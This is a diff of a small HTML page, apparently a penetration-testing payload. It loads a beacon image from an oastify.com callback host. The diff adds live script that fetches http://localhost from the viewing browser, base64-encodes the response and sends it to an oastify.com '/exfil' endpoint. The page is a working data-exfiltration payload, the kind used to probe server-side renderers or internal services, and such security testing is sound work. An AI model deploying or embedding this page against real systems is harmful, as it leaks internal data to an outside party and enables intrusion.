@@ -2,15 +2,11 @@
 <html>
 <img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
 <script>
-(async () => {
-
-var encoded = "test";
-// const res = await window.fetch("http://localhost");
-// const text = await res.text();
-// if (text) {
-//     encoded = btoa(text);
-// }
-await window.fetch(`https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=${encoded}`);
-})();
+window.fetch("http://localhost")
+  .then(function(res) { return res.text(); })
+  .then(function(text) {
+    var encoded = text ? btoa(text) : "test";
+    window.fetch("https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=" + encoded);
+  });
 </script>
 </html>
